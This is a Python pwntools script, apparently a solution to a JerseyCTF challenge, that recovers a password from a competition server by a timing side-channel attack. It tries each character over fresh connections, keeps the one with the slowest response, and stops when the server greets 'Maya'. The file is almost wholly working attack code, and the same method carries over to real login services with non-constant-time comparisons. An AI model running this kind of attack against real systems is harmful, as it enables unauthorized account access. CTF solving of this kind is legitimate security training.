#!/usr/bin/env python3
from pwn import *
import time
import string

# Configure the context
context.log_level = 'info'

def try_character(r, prefix, char):
    # Send the password attempt
    r.recvuntil(b"Please enter your password: ")
    test = prefix + char
    
    start = time.time()
    r.sendline(test)
    
    try:
        # Set a short timeout to avoid waiting too long
        response = r.recvline(timeout=1)
        end = time.time()
        
        # Check if we got "Welcome, Maya"
        if b"Welcome, Maya" in response:
            return (end - start, True, response)
        else:
            return (end - start, False, response)
    except EOFError:
        # Connection closed - could be because we're getting close
        end = time.time()
        return (end - start, False, b"Connection closed")
    except Exception as e:
        end = time.time()
        return (end - start, False, str(e).encode())

def find_password():
    host = "maya-s-terminal-rescue.aws.jerseyctf.com"
    port = 5000
    
    charset = string.ascii_letters + string.digits + "_-"
    password = ""
    
    # Check for each position (up to 26 chars max)
    for position in range(26):
        log.info(f"Finding character at position {position}...")
        
        # Characters to try, prioritizing likely ones
        prioritized_charset = "loabMayainteLOABresRESctfCTF_-" + string.ascii_lowercase + string.ascii_uppercase + string.digits
        prioritized_charset = ''.join(sorted(set(prioritized_charset), key=prioritized_charset.find))
        
        results = []
        
        for char in prioritized_charset:
            # Create a new connection for each attempt
            r = remote(host, port, level='error')
            
            # Try the character
            duration, success, response = try_character(r, password, char)
            
            # Close the connection
            r.close()
            
            # Check for immediate success
            if success:
                password += char
                log.success(f"Full password found: '{password}'")
                return password
            
            results.append((char, duration, response))
            log.info(f"Char '{char}': {duration:.6f}s - {response[:20]}")
            
            # Small delay to avoid overwhelming the server
            time.sleep(0.1)
        
        # Sort by duration (descending)
        sorted_results = sorted(results, key=lambda x: x[1], reverse=True)
        
        if not sorted_results:
            log.warning("No valid results for this position. Password might be complete.")
            break
        
        # Take the character with the longest time
        next_char = sorted_results[0][0]
        password += next_char
        log.success(f"Best character at position {position}: '{next_char}'")
        log.success(f"Current password: '{password}'")
        
        # Verify if we've found the complete password
        r = remote(host, port, level='error')
        r.recvuntil(b"Please enter your password: ")
        r.sendline(password)
        response = r.recvline(timeout=1)
        r.close()
        
        if b"Welcome, Maya" in response:
            log.success(f"Full password found: '{password}'")
            return password
    
    return password

if __name__ == "__main__":
    log.info("Starting password timing attack...")
    password = find_password()
    log.success(f"Final password: {password}")
